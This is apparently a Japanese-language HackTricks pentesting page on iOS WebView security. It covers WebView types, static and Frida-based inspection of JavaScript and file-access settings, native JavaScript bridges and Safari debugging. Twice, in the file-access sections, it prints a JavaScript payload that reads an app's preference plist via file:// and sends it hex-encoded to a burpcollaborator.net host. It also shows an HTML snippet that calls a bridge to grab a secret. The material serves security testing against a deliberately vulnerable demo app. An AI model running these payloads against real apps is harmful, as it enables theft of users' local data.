# iOS WebViews

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**GitHubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>

## WebViewsの種類

WebViewsは、インタラクティブな**web** **コンテンツ**を表示するためのアプリ内ブラウザコンポーネントです。これらは、webコンテンツをアプリのユーザーインターフェースに直接埋め込むために使用されます。iOS WebViewsは**デフォルトで** **JavaScript**の実行を**サポート**しているため、スクリプトの注入やクロスサイトスクリプティング攻撃の影響を受ける可能性があります。

* [**UIWebView**](https://developer.apple.com/documentation/uikit/uiwebview)**:** UIWebViewはiOS 12から非推奨となっており、使用すべきではありません。**JavaScriptを無効にすることはできません**。
* [**WKWebView**](https://developer.apple.com/documentation/webkit/wkwebview): アプリ機能の拡張、表示されるコンテンツの制御に適した選択です。
* **JavaScript**はデフォルトで有効ですが、`WKWebView`の**`javaScriptEnabled`**プロパティにより、**完全に無効化することができ**、すべてのスクリプト注入の欠陥を防ぐことができます。
* **`JavaScriptCanOpenWindowsAutomatically`**は、JavaScriptが新しいウィンドウ（例えばポップアップ）を**開くのを防ぐ**ために使用できます。
* **`hasOnlySecureContent`**プロパティは、WebViewによってロードされるリソースが暗号化された接続を通じて取得されていることを確認するために使用できます。
* `WKWebView`はプロセス外レンダリングを実装しているため、**メモリ破損バグが**メインアプリプロセスに影響を与えることは**ありません**。
*   [**SFSafariViewController**](https://developer.apple.com/documentation/safariservices/sfsafariviewcontroller)**:** **一般的なwebビューイング体験**を提供するために使用すべきです。これらのWebViewsは、以下の要素を含む特徴的なレイアウトを持っているため、簡単に見分けることができます：

* 読み取り専用のアドレスフィールドとセキュリティインジケーター。
* アクション（"**共有**"）**ボタン**。
* **完了ボタン**、戻ると進むナビゲーションボタン、およびSafariで直接ページを開くための"Safari"ボタン。

<img src="https://gblobscdn.gitbook.com/assets%2F-LH00RC4WVf3-6Ou4e0l%2F-Lf1APQHyCHdAvoJSvc_%2F-Lf1AQxr7FPsOyPFSGcs%2Fsfsafariviewcontroller.png?alt=media" alt="" data-size="original">

* `SFSafariViewController`では**JavaScriptを無効にすることはできません**。これは、アプリのユーザーインターフェースを拡張する目的で`WKWebView`の使用が推奨される理由の一つです。
* `SFSafariViewController`はまた、**Safari**とクッキーや他のウェブサイトデータを**共有します**。
* `SFSafariViewController`でのユーザーの活動や相互作用はアプリには**見えません**。アプリはオートフィルデータ、ブラウジング履歴、またはウェブサイトデータにアクセスすることはできません。
* App Store Review Guidelinesによると、`SFSafariViewController`は他のビューやレイヤーによって**隠されたり、覆い隠されたりしてはなりません**。

## WebViewsの設定を発見する

### 静的解析

**UIWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "UIWebView$"
489 0x0002fee9 0x10002fee9   9  10 (5.__TEXT.__cstring) ascii UIWebView
896 0x0003c813 0x0003c813  24  25 () ascii @_OBJC_CLASS_$_UIWebView
1754 0x00059599 0x00059599  23  24 () ascii _OBJC_CLASS_$_UIWebView
```
**WKWebView**
```bash
$ rabin2 -zz ./WheresMyBrowser | egrep "WKWebView$"
490 0x0002fef3 0x10002fef3   9  10 (5.__TEXT.__cstring) ascii WKWebView
625 0x00031670 0x100031670  17  18 (5.__TEXT.__cstring) ascii unwindToWKWebView
904 0x0003c960 0x0003c960  24  25 () ascii @_OBJC_CLASS_$_WKWebView
1757 0x000595e4 0x000595e4  23  24 () ascii _OBJC_CLASS_$_WKWebView
```
WebViewクラスの既知のメソッドを検索することもできます。例えば、WKWebViewを初期化するために使用されるメソッド([`init(frame:configuration:)`](https://developer.apple.com/documentation/webkit/wkwebview/1414998-init))を検索します：
```bash
$ rabin2 -zzq ./WheresMyBrowser | egrep "WKWebView.*frame"
0x5c3ac 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x5d97a 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
0x6b5d5 77 76 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfC
0x6c3fa 79 78 __T0So9WKWebViewCABSC6CGRectV5frame_So0aB13ConfigurationC13configurationtcfcTO
```
#### JavaScriptの設定をテストする

`WKWebView`において、ベストプラクティスとして、JavaScriptは明示的に必要な場合を除き無効にすべきです。JavaScriptが適切に無効にされているかを確認するために、プロジェクト内で`WKPreferences`の使用箇所を検索し、[`javaScriptEnabled`](https://developer.apple.com/documentation/webkit/wkpreferences/1536203-javascriptenabled)プロパティが`false`に設定されていることを確認します：
```
let webPreferences = WKPreferences()
webPreferences.javaScriptEnabled = false
```
コンパイルされたバイナリのみを持っている場合、これを検索できます：
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "javascriptenabled"
391 0x0002f2c7 0x10002f2c7  17  18 (4.__TEXT.__objc_methname) ascii javaScriptEnabled
392 0x0002f2d9 0x10002f2d9  21  22 (4.__TEXT.__objc_methname) ascii setJavaScriptEnabled
```
#### OnlySecureContentのテスト

`UIWebView`とは対照的に、`WKWebView`を使用すると、[混在コンテンツ](https://developers.google.com/web/fundamentals/security/prevent-mixed-content/fixing-mixed-content?hl=en)（HTTPSページからロードされたHTTPコンテンツ）を検出することが可能です。[`hasOnlySecureContent`](https://developer.apple.com/documentation/webkit/wkwebview/1415002-hasonlysecurecontent)メソッドを使用することで、ページ上のすべてのリソースが安全に暗号化された接続を通じてロードされたかどうかを検証できます。\
コンパイルされたバイナリ内で：
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "hasonlysecurecontent"
```
ソースコードや文字列内で "http:// "という文字列を検索することもできます。しかし、これは必ずしも混在コンテンツの問題があるとは限りません。混在コンテンツについての詳細は、[MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/Security/Mixed\_content)で学ぶことができます。

### 動的分析

`ObjC.choose()` を使用してヒープを検査し、異なるタイプのWebViewsのインスタンスを見つけることができます。また、プロパティ `javaScriptEnabled` と `hasonlysecurecontent` を検索することも可能です：

{% code title="webviews_inspector.js" %}
```javascript
ObjC.choose(ObjC.classes['UIWebView'], {
onMatch: function (ui) {
console.log('onMatch: ', ui);
console.log('URL: ', ui.request().toString());
},
onComplete: function () {
console.log('done for UIWebView!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});

ObjC.choose(ObjC.classes['SFSafariViewController'], {
onMatch: function (sf) {
console.log('onMatch: ', sf);
},
onComplete: function () {
console.log('done for SFSafariViewController!');
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('javaScriptEnabled:', wk.configuration().preferences().javaScriptEnabled());
}
});

ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
}
});
```
```
Load it with:
```
```bash
frida -U com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>

hasOnlySecureContent:  false
```
## WebView プロトコル処理

iOSのWebViewで解釈されるいくつかのデフォルトスキームがあります。例えば：

* http(s)://
* file://
* tel://

WebViewはエンドポイントからリモートコンテンツをロードすることができますが、アプリデータディレクトリからローカルコンテンツをロードすることもできます。ローカルコンテンツがロードされる場合、ユーザーはファイル名やファイルをロードするために使用されるパスに影響を与えることができず、ロードされたファイルを編集することもできません。

### WebView コンテンツのロード

* **UIWebView**: 非推奨のメソッド [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617979-loadhtmlstring?language=objc) または [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/uikit/uiwebview/1617941-loaddata?language=objc) を使用してコンテンツをロードできます。
* **WKWebView**: メソッド [`loadHTMLString:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415004-loadhtmlstring?language=objc) または [`loadData:MIMEType:textEncodingName:baseURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1415011-loaddata?language=objc) を使用してローカルHTMLファイルをロードし、`loadRequest:` を使用してWebコンテンツをロードします。通常、ローカルファイルは [`pathForResource:ofType:`](https://developer.apple.com/documentation/foundation/nsbundle/1410989-pathforresource)、[`URLForResource:withExtension:`](https://developer.apple.com/documentation/foundation/nsbundle/1411540-urlforresource?language=objc)、[`init(contentsOf:encoding:)`](https://developer.apple.com/documentation/swift/string/3126736-init) などのメソッドと組み合わせてロードされます。さらに、アプリがメソッド [`loadFileURL:allowingReadAccessToURL:`](https://developer.apple.com/documentation/webkit/wkwebview/1414973-loadfileurl?language=objc) を使用しているかどうかも確認する必要があります。その最初のパラメータは `URL` で、WebViewにロードされるURLを含み、2番目のパラメータ `allowingReadAccessToURL` は単一のファイルまたはディレクトリを含むことがあります。単一のファイルを含む場合、そのファイルはWebViewで利用可能になります。しかし、ディレクトリを含む場合、その**ディレクトリ内のすべてのファイルがWebViewで利用可能になります**。したがって、これを検査し、ディレクトリの場合は、その中に機密データが含まれていないかを確認することが重要です。

ソースコードを持っている場合、これらのメソッドを検索できます。**コンパイルされた** **バイナリ**を持っている場合も、これらのメソッドを検索できます。
```bash
$ rabin2 -zz ./WheresMyBrowser | grep -i "loadHTMLString"
231 0x0002df6c 24 (4.__TEXT.__objc_methname) ascii loadHTMLString:baseURL:
```
### ファイルアクセス

* **UIWebView:**
* `file://` スキームは常に有効です。
* `file://` URLからのファイルアクセスは常に有効です。
* `file://` URLからのユニバーサルアクセスは常に有効です。
* `baseURL` も `nil` に設定されている `UIWebView` から有効なオリジンを取得すると、**"null"に設定されていない**ことがわかります。代わりに、次のようなものが得られます: `applewebdata://5361016c-f4a0-4305-816b-65411fc1d780`。このオリジン "applewebdata://" は "file://" オリジンと似ており、**Same-Origin Policyを実装していない**ため、ローカルファイルや任意のウェブリソースへのアクセスを許可します。

{% tabs %}
{% tab title="exfiltrate_file" %}
```javascript
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
{% endtab %}
{% endtabs %}

* **WKWebView**:
* **`allowFileAccessFromFileURLs`** (`WKPreferences`, デフォルトでは`false`): `file://`スキームURLのコンテキストで実行されるJavaScriptが、他の`file://`スキームURLのコンテンツにアクセスできるようにします。
* **`allowUniversalAccessFromFileURLs`** (`WKWebViewConfiguration`, デフォルトでは`false`): `file://`スキームURLのコンテキストで実行されるJavaScriptが、任意のオリジンのコンテンツにアクセスできるようにします。

これらの関数をアプリケーションのソースコードやコンパイルされたバイナリで検索することができます。\
また、以下のfridaスクリプトを使用してこの情報を見つけることができます：
```bash
ObjC.choose(ObjC.classes['WKWebView'], {
onMatch: function (wk) {
console.log('onMatch: ', wk);
console.log('URL: ', wk.URL().toString());
console.log('javaScriptEnabled: ', wk.configuration().preferences().javaScriptEnabled());
console.log('allowFileAccessFromFileURLs: ',
wk.configuration().preferences().valueForKey_('allowFileAccessFromFileURLs').toString());
console.log('hasOnlySecureContent: ', wk.hasOnlySecureContent().toString());
console.log('allowUniversalAccessFromFileURLs: ',
wk.configuration().valueForKey_('allowUniversalAccessFromFileURLs').toString());
},
onComplete: function () {
console.log('done for WKWebView!');
}
});
```

```bash
frida -U -f com.authenticationfailure.WheresMyBrowser -l webviews_inspector.js

onMatch:  <WKWebView: 0x1508b1200; frame = (0 0; 320 393); layer = <CALayer: 0x1c4238f20>>
URL:  file:///var/mobile/Containers/Data/Application/A654D169-1DB7-429C-9DB9-A871389A8BAA/
Library/WKWebView/scenario1.html
javaScriptEnabled:  true
allowFileAccessFromFileURLs:  0
hasOnlySecureContent:  false
allowUniversalAccessFromFileURLs:  0
```
#### 任意のファイルを抽出する
```javascript
//For some reason this payload doesn't work!!
//Let me know if you know how to exfiltrate local files from a WKWebView
String.prototype.hexEncode = function(){
var hex, i;
var result = "";
for (i=0; i<this.length; i++) {
hex = this.charCodeAt(i).toString(16);
result += ("000"+hex).slice(-4);
}
return result
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if (xhr.readyState == XMLHttpRequest.DONE) {
var xhr2 = new XMLHttpRequest();
xhr2.open('GET', 'http://187e2gd0zxunzmb5vlowsz4j1a70vp.burpcollaborator.net/'+xhr.responseText.hexEncode(), true);
xhr2.send(null);
}
}
xhr.open('GET', 'file:///var/mobile/Containers/Data/Application/ED4E0AD8-F7F7-4078-93CC-C350465048A5/Library/Preferences/com.authenticationfailure.WheresMyBrowser.plist', true);
xhr.send(null);
```
## WebViewを通じて露出されるネイティブメソッド

iOS 7以降、Appleは**WebView内のJavaScriptランタイムとネイティブ**のSwiftまたはObjective-Cオブジェクト間の通信を可能にするAPIを導入しました。

ネイティブコードとJavaScriptが通信する基本的な方法は2つあります：

* **JSContext**: Objective-CまたはSwiftブロックが`JSContext`内の識別子に割り当てられると、JavaScriptCoreは自動的にブロックをJavaScript関数にラップします。
* **JSExportプロトコル**: `JSExport`を継承したプロトコルで宣言されたプロパティ、インスタンスメソッド、クラスメソッドは、すべてのJavaScriptコードで利用可能なJavaScriptオブジェクトにマッピングされます。JavaScript環境内のオブジェクトの変更はネイティブ環境に反映されます。

**`JSExport`プロトコルで定義されたクラスメンバーのみ**がJavaScriptコードにアクセス可能になることに注意してください。\
WebViewに関連付けられた`JSContext`にマッピングされたネイティブオブジェクトのコードを探し、どのような機能が露出されているかを分析します。例えば、WebViewにアクセス可能で露出されるべきではない機密データがあります。\
Objective-Cでは、`UIWebView`に関連付けられた`JSContext`は以下のように取得されます：
```objectivec
[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]
```
JavaScript コードは **`WKWebView` でネイティブアプリにメッセージを送信することは可能ですが、`UIWebView` とは対照的に、`WKWebView` の `JSContext` を直接参照することはできません。** 代わりに、メッセージングシステムを使用し、JavaScript オブジェクトをネイティブの Objective-C や Swift オブジェクトに自動的にシリアライズする `postMessage` 関数を使用して通信が実装されます。メッセージハンドラーは、[`add(_ scriptMessageHandler:name:)`](https://developer.apple.com/documentation/webkit/wkusercontentcontroller/1537172-add) メソッドを使用して設定されます。

### JavascriptBridge を有効にする
```swift
func enableJavaScriptBridge(_ enabled: Bool) {
options_dict["javaScriptBridge"]?.value = enabled
let userContentController = wkWebViewConfiguration.userContentController
userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

if enabled {
let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
}
}
```
### メッセージの送信

スクリプトメッセージハンドラを名前 `"name"`（または上記の例では `"javaScriptBridge"`）で追加すると、そのユーザーコンテンツコントローラーを使用するすべてのウェブビューのすべてのフレームでJavaScript関数 `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` が定義されます。それは次のようにHTMLファイルから[使用することができます](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33)：
```javascript
function invokeNativeOperation() {
value1 = document.getElementById("value1").value
value2 = document.getElementById("value2").value
window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
//After testing the previos funtion I got the error TypeError: undefined is not an object (evaluating 'window.webkit.messageHandlers')
//But the following code worked to call the exposed javascriptbridge with the args "addNumbers", "1", "2"

document.location = "javascriptbridge://addNumbers/" + 1 + "/" + 2
```
ネイティブ関数が実行されると、通常は**ウェブページ内でJavaScriptを実行します**（以下の`evaluateJavascript`を参照）。実行される関数を**オーバーライドして**、**結果を盗む**ことに興味があるかもしれません。
例えば、以下のスクリプトでは、**`javascriptBridgeCallBack`** 関数が2つのパラメータ（呼び出された関数と**結果**）を持って実行されます。ロードされるHTMLを制御している場合、結果を表示する**アラートを作成**できます。
```markup
<html>
<script>
document.location = "javascriptbridge://getSecret"
function javascriptBridgeCallBack(name, result) {
alert(result);
}
</script>
</html>
```
### 呼び出された関数

呼び出された関数は[`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29)に存在します:
```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

let arg1 = Double(messageArray[1])!
let arg2 = Double(messageArray[2])!
result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```
### テスト

アプリケーション内でpostMessageを送信するためのテスト方法は以下の通りです:

* サーバーの応答を変更する (MitM)
* Fridaのようなフレームワークを使用して動的なインストルメンテーションを行い、iOS WebViews用の対応するJavaScript評価関数([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc) for `UIWebView` と [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc) for `WKWebView`)を使ってJavaScriptペイロードを注入する。

## iOS WebViewsのデバッグ

([https://blog.vuplex.com/debugging-webviews](https://blog.vuplex.com/debugging-webviews)からのチュートリアル)

iOS webviewsでは、`console.log()`に渡されたメッセージはXcodeのログには表示されません。それでも、Safariの開発者ツールを使ってWebコンテンツを比較的簡単にデバッグすることができますが、いくつかの制限があります:

* iOS webviewsのデバッグにはSafariが必要なので、開発用コンピュータはmacOSを実行している必要があります。
* Xcodeを通じてデバイスにロードされたアプリケーション内のwebviewsのみをデバッグできます。App StoreやApple Configuratorを通じてインストールされたアプリ内のwebviewsはデバッグできません。

これらの制限を念頭に置いて、iOSでwebviewをリモートデバッグする手順は以下の通りです:

* まず、iOSデバイスでSafari Webインスペクタを有効にするために、iOSの_設定_アプリを開き、**設定 > Safari > 高度な設定**に移動し、_Webインスペクタ_オプションをオンに切り替えます。

![iOS Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/ios-safari-settings.jpg)

* 次に、開発用コンピュータのSafariで開発者ツールを有効にする必要があります。開発マシンでSafariを起動し、メニューバーの**Safari > 環境設定**に移動します。表示される環境設定ペインで、_高度な設定_タブをクリックし、下部にある_開発メニューを表示_オプションを有効にします。それを行った後、環境設定ペインを閉じることができます。

![Mac Safari settings](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-settings.jpg)

* iOSデバイスを開発用コンピュータに接続し、アプリを起動します。
* 開発用コンピュータのSafariで、メニューバーの_開発_をクリックし、iOSデバイスの名前が表示されているドロップダウンオプションにカーソルを合わせて、iOSデバイスで実行中のwebviewインスタンスのリストを表示します。

![Mac Safari develop menu](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-develop-menu.jpg)

* デバッグしたいwebviewのドロップダウンオプションをクリックします。これにより、webviewを検査するための新しいSafari Webインスペクタウィンドウが開きます。

![Safari Web Inspector window](https://blog.vuplex.com/article-assets/20190324-debugging-webviews/mac-safari-inspector.jpg)

## 参考文献

* [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06h-testing-platform-interaction#testing-webview-protocol-handlers-mstg-platform-6)
* [https://github.com/authenticationfailure/WheresMyBrowser.iOS](https://github.com/authenticationfailure/WheresMyBrowser.iOS)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォローする**。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有する。

</details>
